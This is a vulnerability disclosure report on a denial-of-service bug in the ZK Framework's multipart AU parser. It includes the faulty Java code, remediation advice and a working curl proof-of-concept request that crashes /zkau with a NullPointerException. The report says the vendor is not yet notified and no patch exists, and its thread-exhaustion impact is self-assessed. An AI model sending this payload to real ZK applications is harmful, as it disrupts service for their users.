# Vulnerability Report: ZK Framework multipart parser DoS

## Submitter
sh7err@vEcho

## Summary
An unauthenticated attacker can crash any ZK-based application by sending a crafted multipart AU request to the update endpoint (typically `/zkau`). The multipart parser (`AuMultipartUploader`) assumes that every `key=value` chunk inside the `data` field contains an equals sign and immediately URL-decodes the key and value. When the attacker omits the `=` sign, the value resolves to `null`, and `URLDecoder.decode(null, ...)` throws a `NullPointerException`. The exception propagates out of the servlet before an AU desktop is resolved, so the request cannot be recovered and the worker thread is terminated, resulting in a remote denial of service.

## Affected product
- Product: ZK Framework (server-side UI framework by ZKoss)
- Version: 10.0.0 through 10.3.0-SNAPSHOT (confirmed on commit f52827f, `AuMultipartUploader` has been shipped since 10.0.0)
- Component: `org.zkoss.zk.au.http.AuMultipartUploader` (multipart AU decoder)

## Technical details
1. `DHtmlUpdateServlet.process()` detects multipart uploads and delegates to `AuMultipartUploader.parseRequest()`.
2. `parseRequest()` eventually calls `splitQuery()` / `splitQueryParameter()` to parse the attacker-controlled `data` field.
3. `splitQueryParameter()` (lines 171-188 of `zk/src/main/java/org/zkoss/zk/au/http/AuMultipartUploader.java`) computes `value = null` for segments without an equals sign, then executes `URLDecoder.decode(value, "UTF-8")`, immediately throwing `NullPointerException`.
4. The exception is not caught (only `FileUploadException` is handled), so the servlet returns HTTP 500 and the AU processing thread dies.

Code excerpt:
```java
public static AbstractMap.SimpleImmutableEntry<String, String> splitQueryParameter(String it) {
    final int idx = it.indexOf("=");
    final String key = idx > 0 ? it.substring(0, idx) : it;
    final String value = idx > 0 && it.length() > idx + 1 ? it.substring(idx + 1) : null;
    return new AbstractMap.SimpleImmutableEntry<>(
        URLDecoder.decode(key, "UTF-8"),
        URLDecoder.decode(value, "UTF-8") // value may be null → NPE
    );
}
```

## Proof of concept
1. Deploy any ZK application (e.g., `mvn jetty:run` in this repository).
2. Run the following request:

```bash
curl -i -s -k -X POST http://localhost:8080/zkau \
  -H 'Content-Type: multipart/form-data; boundary=----v' \
  --data-binary $'------v\r\nContent-Disposition: form-data; name="data"\r\n\r\ncmd_0=foo&foo\r\n------v--\r\n'
```

3. The server responds with `HTTP/1.1 500 Internal Server Error` and the log shows `java.lang.NullPointerException\n\tat java.net.URLDecoder.decode(URLDecoder.java:176)` originating from `splitQueryParameter`.
4. Repeating the request floods worker threads and renders `/zkau` unusable, denying service to all active desktops.

## Impact
- Attack vector: unauthenticated network request.
- Impact: remote denial of service; all AU processing threads can be exhausted, preventing any user interaction on affected ZK desktops.
- CVSS v3.1 (self-assessed): `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` (7.5 / High).

## Remediation
- Treat missing values as empty strings (or reject the request) before calling `URLDecoder.decode`.
- Add input validation and exception handling around `splitQuery()` so malformed parameters cannot crash the servlet.
- Consider returning a controlled error (e.g., `HTTP 400`) when `data` does not conform to the expected `key=value` format.

## Disclosure & status
- Vendor notification: not yet performed.
- Fix status: no patch available at the time of writing.

## References
- Code base: https://github.com/zkoss/zk (tested at commit f52827fab6a1e844bcb0329a5ed3f59f8fb7e690)

## Credits
Discovered by sh7err@vEcho.
